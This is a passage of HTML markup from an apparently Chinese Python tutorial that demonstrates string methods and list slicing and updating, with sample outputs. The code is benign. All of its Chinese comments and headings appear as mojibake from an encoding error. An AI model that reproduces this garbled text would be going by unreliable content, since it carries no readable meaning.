class="token operator">+</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æœ€å¤§å­—ç¬¦: u</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æœ€å°å­—ç¬¦: "</span> <span class="token operator">+</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># æœ€å°å­—ç¬¦: b</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"www.w3cschool.cc"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"èœé¸Ÿæ•™ç¨‹æ—§åœ°å€ï¼š"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># èœé¸Ÿæ•™ç¨‹æ—§åœ°å€ï¼š www.w3cschool.cc</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"èœé¸Ÿæ•™ç¨‹æ–°åœ°å€ï¼š"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"w3cschool.cc"</span><span class="token punctuation">,</span> <span class="token string">"runoob.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># èœé¸Ÿæ•™ç¨‹æ–°åœ°å€ï¼š www.runoob.com</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"is"</span><span class="token punctuation">,</span> <span class="token string">"was"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># thwas was string example....wow!!!</span>str1 <span class="token operator">=</span> <span class="token string">"this is really a string example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"is"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># -1</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># -1</span>str1 <span class="token operator">=</span> <span class="token string">"this is really a string example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"is"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>rindex<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 5</span><span class="token comment"># print (str1.rindex(str2,10))</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ******************this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"     this is string example....wow!!!     "</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#      this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"*****this is string example....wow!!!*****"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># *****this is string example....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¥ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦</span><span class="token comment"># ['this', 'is', 'string', 'example....wow!!!']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¥ i ä¸ºåˆ†éš”ç¬¦</span><span class="token comment"># ['th', 's is string example....wow!!!']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¥ w ä¸ºåˆ†éš”ç¬¦</span><span class="token comment"># ['this is string example....', 'o', '!!!']</span>txt <span class="token operator">=</span> <span class="token string">"Google#Runoob#Taobao#Facebook"</span><span class="token comment"># ç¬¬äºŒä¸ªå‚æ•°ä¸º 1ï¼Œè¿”å›ä¸¤ä¸ªå‚æ•°åˆ—è¡¨</span>x <span class="token operator">=</span> txt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># ['Google', 'Runoob#Taobao#Facebook']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ab c\n\nde fg\rkl\r\n'</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ab c'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'de fg'</span><span class="token punctuation">,</span> <span class="token string">'kl'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ab c\n\nde fg\rkl\r\n'</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['ab c\n', '\n', 'de fg\r', 'kl\r\n']</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'this'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å­—ç¬¦ä¸²æ˜¯å¦ä»¥ this å¼€å¤´</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä»ç¬¬ä¹ä¸ªå­—ç¬¦å¼€å§‹çš„å­—ç¬¦ä¸²æ˜¯å¦ä»¥ string å¼€å¤´</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'this'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä»ç¬¬2ä¸ªå­—ç¬¦å¼€å§‹åˆ°ç¬¬å››ä¸ªå­—ç¬¦ç»“æŸçš„å­—ç¬¦ä¸²æ˜¯å¦ä»¥ this å¼€å¤´</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123abcrunoob321"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å­—ç¬¦åºåˆ—ä¸º 12</span><span class="token comment"># 3abcrunoob3</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>swapcase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># THIS IS STRING EXAMPLE....WOW!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"This Is String Example....WOW!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>swapcase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># tHIS iS sTRING eXAMPLE....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># This Is String Example From Runoob....Wow!!!</span>txt <span class="token operator">=</span> <span class="token string">"hello b2b2b2 and 3g3g3g"</span>x <span class="token operator">=</span> txt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment"># éå­—æ¯åçš„ç¬¬ä¸€ä¸ªå­—æ¯å°†è½¬æ¢ä¸ºå¤§å†™å­—æ¯</span><span class="token comment"># Hello B2B2B2 And 3G3G3G</span>intab <span class="token operator">=</span> <span class="token string">"aeiou"</span>outtab <span class="token operator">=</span> <span class="token string">"12345"</span>trantab <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>intab<span class="token punctuation">,</span> outtab<span class="token punctuation">)</span>  <span class="token comment"># åˆ¶ä½œç¿»è¯‘è¡¨</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span>trantab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># th3s 3s str3ng 2x1mpl2....w4w!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.upper() : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.zfill : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.zfill :  this is string example from runoob....wow!!!</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.zfill : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.zfill :  000000this is string example from runoob....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob2016"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdecimal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"23443434"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdecimal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token triple-quoted-string string">'''str.capitalize() :  This is string example from runoob....wow!!!str.center(40, '*') :  ****************[runoob]****************str.count('o') :  3str.count('run', 0, 10) :  1èœé¸Ÿæ•™ç¨‹UTF-8 ç¼–ç ï¼š b'\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b'GBK ç¼–ç ï¼š b'\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc'UTF-8 è§£ç ï¼š èœé¸Ÿæ•™ç¨‹GBK è§£ç ï¼š èœé¸Ÿæ•™ç¨‹TrueTrueFalseFalseåŸå§‹å­—ç¬¦ä¸²: runoob12345abcæ›¿æ¢ \t ç¬¦å·: runoob  12345   abcä½¿ç”¨ 2 ä¸ªç©ºæ ¼æ›¿æ¢ \t ç¬¦å·: runoob  12345 abcä½¿ç”¨ 3 ä¸ªç©ºæ ¼: runoob   12345 abcä½¿ç”¨ 4 ä¸ªç©ºæ ¼: runoob  12345   abcä½¿ç”¨ 5 ä¸ªç©ºæ ¼: runoob    12345     abcä½¿ç”¨ 6 ä¸ªç©ºæ ¼: runoob      12345 abc77-177TrueFalseTrueTrueFalseTrueFalseFalseTrueFalseTrueTrueFalseTrueFalseTrueFalser-u-n-o-o-brunoob65Runoob example....wow!!!**************************runoob example....wow!!!this is string example....wow!!!     this is string example....wow!!!8888888th3s 3s str3ng 2x1mpl2....w4w!!!æœ€å¤§å­—ç¬¦: uæœ€å°å­—ç¬¦: bèœé¸Ÿæ•™ç¨‹æ—§åœ°å€ï¼š www.w3cschool.ccèœé¸Ÿæ•™ç¨‹æ–°åœ°å€ï¼š www.runoob.comthwas was string example....wow!!!55-122-15******************this is string example....wow!!!     this is string example....wow!!!*****this is string example....wow!!!['this', 'is', 'string', 'example....wow!!!']['th', 's is string example....wow!!!']['this is string example....', 'o', '!!!']['Google', 'Runoob#Taobao#Facebook']['ab c', '', 'de fg', 'kl']['ab c\n', '\n', 'de fg\r', 'kl\r\n']TrueTrueFalse3abcrunoob3THIS IS STRING EXAMPLE....WOW!!!tHIS iS sTRING eXAMPLE....wow!!!This Is String Example From Runoob....Wow!!!Hello B2B2B2 And 3G3G3Gth3s 3s str3ng 2x1mpl2....w4w!!!str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!str.zfill :  this is string example from runoob....wow!!!str.zfill :  000000this is string example from runoob....wow!!!FalseTrue'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><ol><li>ç´¢å¼•æˆªå–æ–¹å¼ä¸å…ƒç»„ç›¸åŒ</li><li>æˆªå–åæˆä¸ºä¸€ä¸ªæ–°åˆ—è¡¨</li><li>å…ƒç´ åœ¨æ‰“æ–¹æ‹¬å·ä¸­ï¼Œä»¥é€—å·åˆ†éš”</li><li>åˆ—è¡¨çš„å…ƒç´ å¯æ”¹å˜</li><li>å…ƒç´ å¯ä»¥æ˜¯å…ƒç»„</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºå®Œæ•´åˆ—è¡¨</span><span class="token comment"># ['test', 1, 1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºåˆ—è¡¨ç¬¬ä¸€ä¸ªå…ƒç´ </span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># ä»ç¬¬äºŒä¸ªå¼€å§‹è¾“å‡ºåˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ </span><span class="token comment"># [1, 1.2]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºä»ç¬¬ä¸‰ä¸ªå…ƒç´ å¼€å§‹çš„æ‰€æœ‰å…ƒç´ </span><span class="token comment"># [1.2, 999]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2 <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºä¸¤æ¬¡åˆ—è¡¨</span><span class="token comment"># [1, 'test', 1, 'test']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span> <span class="token operator">+</span> list2<span class="token punctuation">)</span>  <span class="token comment"># è¿æ¥åˆ—è¡¨</span><span class="token comment"># ['test', 1, 1.2, 999, 1, 'test']</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span>  <span class="token comment"># ä¿®æ”¹ç¬¬ä¸€å…ƒç´ </span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 3, 4, 5]</span>list3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span>  <span class="token comment"># ä¿®æ”¹ç¬¬ä¸‰ä¸ªåˆ°ç¬¬å››å…ƒç´ </span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['test', 2, 22, 33, 5]</span>list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">)</span><span class="token comment"># [1, 2, 3, 4, 5]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># ç¬¬ä¸€ä¸ª-1è¡¨ç¤ºä»æœ€åä¸€ä¸ªå¼€å§‹</span><span class="token comment"># ä¸­é—´ä¸ºç©ºè¡¨ç¤ºç§»åŠ¨åˆ°åˆ—è¡¨æœ«,æœ€åä¸€ä¸ª-1ä¸ºæ­¥é•¿,-è¡¨ç¤ºé€†å‘</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [4, 3, 2]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># [5]</span><span class="token triple-quoted-string string">'''['test', 1, 1.2, 999]test[1, 1.2][1.2, 999][1, 'test', 1, 'test']['test', 1, 1.2, 999, 1, 'test'][1, 2, 3, 4, 5]['test', 2, 3, 4, 5]['test', 2, 22, 33, 5][1, 2, 3, 4, 5][5, 4, 3, 2, 1][4, 3, 2][5]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ›´æ–°å’Œåˆ é™¤å…ƒç´ "><a href="#æ›´æ–°å’Œåˆ é™¤å…ƒç´ " class="headerlink" title="æ›´æ–°å’Œåˆ é™¤å…ƒç´ "></a>æ›´æ–°å’Œåˆ é™¤å…ƒç´ </h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list5<span class="token punctuation">)</span>list5<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'restart'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list5<span class="token punctuation">)</span>  <span class="token comment"># åœ¨æœ«å°¾æ·»åŠ å…ƒç´ </span><span class="token keyword">del</span> list5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment"># åˆ é™¤ç¬¬ä¸‰ä¸ªå…ƒç´ </span><span class="token keyword">print</span><span class="token punctuation">(</span>list5<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 3, 5, 'test'][1, 3, 5, 'test', 'restart'][1, 3, 'test', 'restart']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åˆ—è¡¨è„šæœ¬æ“ä½œç¬¦"><a href="#åˆ—è¡¨è„šæœ¬æ“ä½œç¬¦" class="headerlink" title="åˆ—è¡¨è„šæœ¬æ“ä½œç¬¦"></a>åˆ—è¡¨è„šæœ¬æ“ä½œç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">list6 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list6<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list6<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ—è¡¨é•¿åº¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># ç»„åˆ</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># é‡å¤</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># å­˜åœ¨ä¸å¦</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token 